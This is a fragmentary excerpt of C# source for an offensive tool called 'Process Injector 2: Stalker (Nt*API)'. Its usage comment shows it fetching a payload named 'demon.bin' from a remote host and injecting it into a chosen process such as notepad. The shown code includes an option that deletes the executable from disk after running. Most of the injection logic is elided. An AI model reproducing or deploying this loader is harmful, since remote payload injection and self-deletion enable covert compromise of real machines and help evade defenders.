...
// Stalker.exe -u "https://192.168.231.128:9090/demon.bin" -t notepad -p 8972 -k
     ...
     \       `'  |  `'       /
      \          |          /
       ...
       \         |         /
        ...
        {
            Console.WriteLine("Process Injector 2: Stalker (Nt*API)");
            Console.WriteLine("");
        ...
        static async Task Main(string[] args)
        {
            ...
            else
            {
                ...
                if (options.Kill)
                {
                    SelfDelete("1");
                    Console.WriteLine("");
                    Console.WriteLine("[>] Stalker.exe removed from disk!");
                }
            }
        }
    }
